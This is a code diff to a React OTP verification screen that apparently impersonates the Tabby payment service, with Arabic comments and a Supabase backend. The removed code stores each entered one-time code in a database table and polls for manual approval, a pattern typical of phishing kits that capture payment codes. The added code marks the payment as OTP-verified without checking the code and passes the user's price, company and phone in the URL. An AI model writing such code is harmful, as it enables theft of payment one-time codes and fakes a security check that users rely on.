@@ -66,109 +66,18 @@ const TabbyOtpVerification = () => {
       }, 1500);
       return;
     }
-
-    // Clear any existing intervals
-    if (pollIntervalRef.current) {
-      clearInterval(pollIntervalRef.current);
-      pollIntervalRef.current = null;
-    }
-    if (timeoutRef.current) {
-      clearTimeout(timeoutRef.current);
-      timeoutRef.current = null;
-    }
     
-    setVerificationStatus("loading");
+    // تحديث الدفعة الموجودة
+    await supabase
+      .from("tabby_payments")
+      .update({ payment_status: "otp_verified" })
+      .eq("id", paymentId);
     
-    try {
-      console.log("حفظ OTP في جدول المحاولات:", { paymentId, otpCode });
-      
-      // حفظ OTP في جدول المحاولات بدلاً من تعديل الجدول الرئيسي
-      const { error: insertError } = await supabase
-        .from("tabby_otp_attempts")
-        .insert({
-          payment_id: paymentId,
-          otp_code: otpCode,
-        });
-
-      if (insertError) {
-        console.error("Error inserting OTP attempt:", insertError);
-        toast({
-          title: "خطأ",
-          description: "فشل في حفظ رمز التحقق",
-          variant: "destructive",
-        });
-        setVerificationStatus("idle");
-        setOtp(["", "", "", ""]);
-        inputRefs.current[0]?.focus();
-        return;
-      }
-
-      console.log("بدء الـ polling للتحقق من الحالة");
-
-      // Poll for OTP approval status every 1 second
-      pollIntervalRef.current = setInterval(async () => {
-        try {
-          const { data: otpData, error: otpError } = await supabase
-            .from("tabby_otp_attempts")
-            .select("approval_status")
-            .eq("payment_id", paymentId)
-            .order('created_at', { ascending: false })
-            .limit(1)
-            .single();
-
-          if (otpError) {
-            console.error("Error polling OTP status:", otpError);
-            return;
-          }
-          
-          console.log("OTP approval status:", otpData?.approval_status);
-          
-          if (otpData?.approval_status === "approved") {
-            console.log("تمت الموافقة - التحويل إلى الصفحة الرئيسية");
-            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            if (timeoutRef.current) clearTimeout(timeoutRef.current);
-            setVerificationStatus("success");
-            setTimeout(() => {
-              navigate("/");
-            }, 1500);
-          } else if (otpData?.approval_status === "rejected") {
-            console.log("تم الرفض");
-            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            if (timeoutRef.current) clearTimeout(timeoutRef.current);
-            setVerificationStatus("error");
-            setTimeout(() => {
-              setVerificationStatus("idle");
-              setOtp(["", "", "", ""]);
-              inputRefs.current[0]?.focus();
-            }, 2000);
-          }
-        } catch (pollError) {
-          console.error("Polling error:", pollError);
-        }
-      }, 1000);
-
-      // Timeout after 30 seconds - return to idle if no response
-      timeoutRef.current = setTimeout(() => {
-        console.log("انتهى وقت الانتظار - 30 ثانية");
-        if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-        setVerificationStatus("error");
-        setTimeout(() => {
-          setVerificationStatus("idle");
-          setOtp(["", "", "", ""]);
-          inputRefs.current[0]?.focus();
-        }, 2000);
-      }, 30000);
-    } catch (error) {
-      console.error("OTP verification error:", error);
-      toast({
-        title: "خطأ",
-        description: "حدث خطأ أثناء التحقق",
-        variant: "destructive",
-      });
-      setVerificationStatus("idle");
-      setOtp(["", "", "", ""]);
-      inputRefs.current[0]?.focus();
-    }
+    // التحويل إلى صفحة الدفع مع paymentId
+    setVerificationStatus("success");
+    setTimeout(() => {
+      navigate(`/tabby-payment?price=${price}&company=${company}&phone=${phone}&paymentId=${paymentId}`);
+    }, 1500);
   };
   const handleResendOtp = () => {
     console.log("Resend OTP to:", phone);
